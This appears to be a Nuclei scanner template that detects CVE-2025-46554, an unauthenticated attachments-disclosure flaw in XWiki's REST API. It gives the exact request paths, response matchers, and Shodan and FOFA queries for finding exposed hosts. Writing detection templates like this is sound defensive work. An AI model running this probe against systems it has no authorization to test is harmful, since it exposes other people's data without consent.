http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_any(header, 'text/xml', 'text/javascript')
    - contains_all(body, '<attachments', '<item', '<longSize')
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/{{path}}'
  payloads:
    path:
    - rest/wikis/xwiki/spaces/Sandbox/pages/WebHome/attachments
    - xwiki/rest/wikis/xwiki/spaces/Sandbox/pages/WebHome/attachments
  stop-at-first-match: true
id: CVE-2025-46554
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:xwiki:xwiki:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-285
  description: 'A vulnerability in XWiki''s REST API allows unauthenticated users
    to access attachments list and metadata through the attachments endpoint. This
    could lead to disclosure of sensitive information stored in attachments metadata.

    '
  impact: 'Unauthenticated users can access attachment lists and metadata through
    the REST API attachments endpoint, potentially exposing sensitive information.

    '
  metadata:
    fofa-query: body="data-xwiki-reference"
    max-request: 2
    product: xwiki
    shodan-query: html:"data-xwiki-reference"
    vendor: xwiki
    verified: true
  name: XWiki REST API - Attachments Disclosure
  reference:
  - https://jira.xwiki.org/browse/XWIKI-22424
  - https://nvd.nist.gov/vuln/detail/CVE-2025-46554
  remediation: 'Upgrade to the latest XWiki version that implements proper authorization
    checks for the attachments REST API endpoint.

    '
  severity: high
  tags: cve,cve2025,xwiki,rest-api,exposure,vkev,vuln
